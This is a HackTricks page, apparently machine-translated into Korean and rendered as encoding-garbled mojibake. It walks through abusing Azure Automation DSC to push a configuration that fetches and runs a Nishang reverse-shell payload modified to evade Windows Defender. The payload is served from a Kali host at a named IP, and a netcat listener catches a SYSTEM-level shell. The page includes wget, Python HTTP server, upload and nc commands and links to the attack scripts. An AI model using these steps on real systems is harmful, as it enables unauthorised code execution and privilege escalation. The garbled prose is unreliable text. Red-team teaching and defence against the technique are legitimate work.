# Az - ìƒíƒœ êµ¬ì„± RCE

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

**ì „ì²´ ê²Œì‹œë¬¼ì€ ì—¬ê¸°ì—ì„œ í™•ì¸í•˜ì„¸ìš”: [https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)**

### ì›ê²© ì„œë²„ (C2) ì¸í”„ë¼ ì¤€ë¹„ ë° ë‹¨ê³„ ìš”ì•½

#### ê°œìš”
ì´ ê³¼ì •ì€ Windows Defenderë¥¼ ìš°íšŒí•˜ëŠ” ëª©ì ìœ¼ë¡œ ìˆ˜ì •ëœ Nishang `Invoke-PowerShellTcp.ps1` í˜ì´ë¡œë“œì¸ `RevPS.ps1`ì„ í˜¸ìŠ¤íŒ…í•˜ê¸° ìœ„í•´ ì›ê²© ì„œë²„ ì¸í”„ë¼ë¥¼ ì„¤ì •í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. í˜ì´ë¡œë“œëŠ” IP `40.84.7.74`ë¥¼ ê°€ì§„ Kali Linux ê¸°ê³„ì—ì„œ ê°„ë‹¨í•œ Python HTTP ì„œë²„ë¥¼ ì‚¬ìš©í•˜ì—¬ ì œê³µë©ë‹ˆë‹¤. ì´ ì‘ì—…ì€ ë‹¤ìŒê³¼ ê°™ì€ ë‹¨ê³„ë¡œ ì‹¤í–‰ë©ë‹ˆë‹¤:

#### ë‹¨ê³„ 1 â€” íŒŒì¼ ìƒì„±
- **í•„ìš”í•œ íŒŒì¼:** ë‘ ê°œì˜ PowerShell ìŠ¤í¬ë¦½íŠ¸ê°€ í•„ìš”í•©ë‹ˆë‹¤:
1. `reverse_shell_config.ps1`: í˜ì´ë¡œë“œë¥¼ ê°€ì ¸ì™€ ì‹¤í–‰í•˜ëŠ” Desired State Configuration (DSC) íŒŒì¼ì…ë‹ˆë‹¤. [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1)ì—ì„œ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
2. `push_reverse_shell_config.ps1`: êµ¬ì„±ì„ VMì— ê²Œì‹œí•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¡œ, [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1)ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- **ì‚¬ìš©ì ì •ì˜:** ì´ëŸ¬í•œ íŒŒì¼ì˜ ë³€ìˆ˜ì™€ ë§¤ê°œë³€ìˆ˜ëŠ” ì‚¬ìš©ìì˜ íŠ¹ì • í™˜ê²½ì— ë§ê²Œ ì¡°ì •ë˜ì–´ì•¼ í•©ë‹ˆë‹¤. ì´ëŠ” ë¦¬ì†ŒìŠ¤ ì´ë¦„, íŒŒì¼ ê²½ë¡œ ë° ì„œë²„/í˜ì´ë¡œë“œ ì‹ë³„ìë¥¼ í¬í•¨í•©ë‹ˆë‹¤.

#### ë‹¨ê³„ 2 â€” êµ¬ì„± íŒŒì¼ ì••ì¶•
- `reverse_shell_config.ps1`ì„ `.zip` íŒŒì¼ë¡œ ì••ì¶•í•˜ì—¬ Azure Storage Accountë¡œ ì „ì†¡í•  ì¤€ë¹„ë¥¼ í•©ë‹ˆë‹¤.
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### ë‹¨ê³„ 3 â€” ìŠ¤í† ë¦¬ì§€ ì»¨í…ìŠ¤íŠ¸ ì„¤ì • ë° ì—…ë¡œë“œ
- ì••ì¶•ëœ êµ¬ì„± íŒŒì¼ì€ Azureì˜ Set-AzStorageBlobContent cmdletì„ ì‚¬ìš©í•˜ì—¬ ë¯¸ë¦¬ ì •ì˜ëœ Azure Storage ì»¨í…Œì´ë„ˆì¸ azure-pentestì— ì—…ë¡œë“œë©ë‹ˆë‹¤.
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### ë‹¨ê³„ 4 â€” Kali Box ì¤€ë¹„
- Kali ì„œë²„ëŠ” GitHub ì €ì¥ì†Œì—ì„œ RevPS.ps1 í˜ì´ë¡œë“œë¥¼ ë‹¤ìš´ë¡œë“œí•©ë‹ˆë‹¤.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
- ìŠ¤í¬ë¦½íŠ¸ëŠ” ëŒ€ìƒ Windows VMê³¼ ì—­ì‰˜ì„ ìœ„í•œ í¬íŠ¸ë¥¼ ì§€ì •í•˜ê¸° ìœ„í•´ í¸ì§‘ë©ë‹ˆë‹¤.

#### ë‹¨ê³„ 5 â€” êµ¬ì„± íŒŒì¼ ê²Œì‹œ
- êµ¬ì„± íŒŒì¼ì´ ì‹¤í–‰ë˜ì–´ ì—­ì‰˜ ìŠ¤í¬ë¦½íŠ¸ê°€ Windows VMì˜ ì§€ì •ëœ ìœ„ì¹˜ì— ë°°í¬ë©ë‹ˆë‹¤.

#### ë‹¨ê³„ 6 â€” í˜ì´ë¡œë“œ í˜¸ìŠ¤íŒ… ë° ìˆ˜ì‹  ëŒ€ê¸° ì„¤ì •
- Python SimpleHTTPServerë¥¼ ì‹œì‘í•˜ì—¬ í˜ì´ë¡œë“œë¥¼ í˜¸ìŠ¤íŒ…í•˜ê³ , ìˆ˜ì‹  ëŒ€ê¸°ë¥¼ ìœ„í•´ Netcat ë¦¬ìŠ¤ë„ˆë¥¼ ì„¤ì •í•©ë‹ˆë‹¤.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- ì˜ˆì•½ëœ ì‘ì—…ì€ í˜ì´ë¡œë“œë¥¼ ì‹¤í–‰í•˜ì—¬ SYSTEM ìˆ˜ì¤€ì˜ ê¶Œí•œì„ íšë“í•©ë‹ˆë‹¤.

#### ê²°ë¡ 

ì´ í”„ë¡œì„¸ìŠ¤ì˜ ì„±ê³µì ì¸ ì‹¤í–‰ì€ ìê²© ì¦ëª… ë¤í”„ ë˜ëŠ” ì—¬ëŸ¬ ê°€ìƒ ë¨¸ì‹ ìœ¼ë¡œì˜ ê³µê²© í™•ì¥ê³¼ ê°™ì€ ë‹¤ì–‘í•œ ì‘ì—…ì„ ìœ„í•œ ë§ì€ ê°€ëŠ¥ì„±ì„ ì—½ë‹ˆë‹¤. ì´ ê°€ì´ë“œëŠ” Azure Automation DSC ì˜ì—­ì—ì„œ ê³„ì†ëœ í•™ìŠµê³¼ ì°½ì˜ì„±ì„ ì¥ë ¤í•©ë‹ˆë‹¤.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ ì œë¡œì—ì„œ ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ì„ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* íšŒì‚¬ë¥¼ **HackTricksì—ì„œ ê´‘ê³ **í•˜ê±°ë‚˜ **PDFë¡œ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìƒí’ˆ**](https://peass.creator-spring.com)ì„ êµ¬ë§¤í•˜ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
